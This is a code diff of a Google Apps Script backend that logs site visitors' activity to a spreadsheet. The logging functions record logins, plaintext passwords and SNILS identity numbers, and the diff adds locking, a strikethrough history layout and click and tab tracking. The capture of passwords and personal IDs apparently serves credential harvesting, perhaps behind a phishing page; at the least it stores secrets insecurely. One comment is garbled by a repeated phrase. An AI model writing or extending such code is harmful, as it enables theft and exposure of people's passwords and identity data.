@@ -74,6 +74,7 @@ const LOG_COLUMNS = Object.freeze([
   'Статус входа'
 ]);
 const LOG_MAX_AGE_MINUTES = 30;
+const LOG_BLOCK_SIZE = LOG_COLUMNS.length;
 
 /**
  * Подготавливает лист логов и гарантирует наличие актуальных заголовков.
@@ -125,8 +126,16 @@ function formatLogCellValue(col, value) {
  */
 function appendPlainLogRow(sheet, values) {
   const rowIndex = sheet.getLastRow() + 1;
-  const range = sheet.getRange(rowIndex, 1, 1, LOG_COLUMNS.length);
+  const range = sheet.getRange(rowIndex, 1, 1, LOG_BLOCK_SIZE);
   range.setNumberFormat('@').setValues([values]).setWrap(true);
+}
+
+function findLastLogBlockStart(rowValues) {
+  for (let start = rowValues.length - LOG_BLOCK_SIZE; start >= 0; start -= LOG_BLOCK_SIZE) {
+    const block = rowValues.slice(start, start + LOG_BLOCK_SIZE).map(v => String(v ?? '').trim());
+    if (block.some(Boolean)) return start + 1;
+  }
+  return 1;
 }
 
 /**
@@ -252,23 +261,31 @@ function findRecentLogRow(sheet, { login = '', clientInfo = {} }) {
  * @param {string[]} newValues Новые значения по колонкам лога.
  */
 function appendLogLine(sheet, rowIndex, newValues) {
-  const range = sheet.getRange(rowIndex, 1, 1, LOG_COLUMNS.length);
-  const oldValues = range.getValues()[0];
-  const richValues = [];
+  const rowWidth = Math.max(sheet.getLastColumn(), LOG_BLOCK_SIZE);
+  const rowRange = sheet.getRange(rowIndex, 1, 1, rowWidth);
+  const rowValues = rowRange.getValues()[0];
+  const lastBlockStart = findLastLogBlockStart(rowValues);
+  const prevRange = sheet.getRange(rowIndex, lastBlockStart, 1, LOG_BLOCK_SIZE);
+  const prevValues = prevRange.getValues()[0];
+  const strikeStyle = SpreadsheetApp.newTextStyle().setStrikethrough(true).build();
 
-  for (let col = 0; col < LOG_COLUMNS.length; col++) {
-    const oldText = formatLogCellValue(col, oldValues[col]);
-    const oldLines = oldText === '' ? [''] : oldText.split('\n');
-    const nextValue = newValues[col] == null ? '' : String(newValues[col]);
-    const lines = oldLines.length ? oldLines.concat([nextValue]) : [nextValue];
-    richValues.push(buildLogRichText(lines));
+  for (let col = 0; col < LOG_BLOCK_SIZE; col++) {
+    const text = formatLogCellValue(col, prevValues[col]);
+    if (!text) continue;
+    const rich = SpreadsheetApp.newRichTextValue()
+      .setText(text)
+      .setTextStyle(0, text.length, strikeStyle)
+      .build();
+    prevRange.getCell(1, col + 1).setRichTextValue(rich);
   }
 
-  range.setRichTextValues([richValues]).setWrap(true);
+  const nextStart = lastBlockStart + LOG_BLOCK_SIZE;
+  const nextRange = sheet.getRange(rowIndex, nextStart, 1, LOG_BLOCK_SIZE);
+  nextRange.setNumberFormat('@').setValues([newValues]).setWrap(true);
 }
 
 /**
- * Создает первичную строку при открытии сайта.
+ * Создает первичную строку при открытии сайта. при открытии сайта.
  * @param {{login?:string,password?:string,snils?:string,clientInfo?:Object}} payload Данные открытия.
  */
 function logPageOpen({ login = '', password = '', snils = '', clientInfo = {} } = {}) {
@@ -292,10 +309,14 @@ function logPageOpen({ login = '', password = '', snils = '', clientInfo = {} } 
  * @param {{login?:string,password?:string,snils?:string,clientInfo?:Object,status:string}} payload
  */
 function logAccess({ login = '', password = '', snils = '', clientInfo = {}, status }) {
-  const sheet = getLogSheet();
-  if (!sheet) return;
+  const lock = LockService.getScriptLock();
+  lock.waitLock(30000);
 
-  const values = [
+  try {
+    const sheet = getLogSheet();
+    if (!sheet) return;
+
+    const values = [
     formatLogDateTime(new Date()),
     login,
     password,
@@ -307,12 +328,15 @@ function logAccess({ login = '', password = '', snils = '', clientInfo = {}, sta
   ];
   const rowIndex = findRecentLogRow(sheet, { login, clientInfo });
 
-  if (rowIndex > 0) {
-    appendLogLine(sheet, rowIndex, values);
-    return;
-  }
+    if (rowIndex > 0) {
+      appendLogLine(sheet, rowIndex, values);
+      return;
+    }
 
-  appendPlainLogRow(sheet, values);
+    appendPlainLogRow(sheet, values);
+  } finally {
+    lock.releaseLock();
+  }
 }
 
 
@@ -323,6 +347,18 @@ function logAccess({ login = '', password = '', snils = '', clientInfo = {}, sta
 function logAuthAttempt(payload) {
   if (payload.clientInfo && payload.clientInfo.silent) return;
   logAccess(payload);
+}
+
+function logLoginButtonClick(login) {
+  logAccess({ login, status: 'Нажал: Войти' });
+}
+
+function logEditFormClick(login) {
+  logAccess({ login, status: 'Нажал: Заполнить / редактировать' });
+}
+
+function logTabNavigation(login, sectionTitle) {
+  logAccess({ login, status: `Перешёл в раздел ${sectionTitle}` });
 }
 
 /**
